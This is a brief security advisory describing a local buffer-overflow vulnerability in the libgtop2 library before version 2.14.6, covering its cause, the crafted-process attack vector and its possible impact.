The 'libgtop2' library is prone to a local buffer-overflow vulnerability because it fails to properly bounds-check user-supplied input before copying into an insufficiently sized memory buffer.

An attacker may exploit this issue by enticing victims into viewing a maliciously crafted system process with an application that uses the affected library.

Successful exploits may cause arbitrary code to run with the privileges of the victim. Failed exploit attempts will likely cause denial-of-service conditions.

Versions prior to libgtop2 2.14.6 are reported vulnerable.
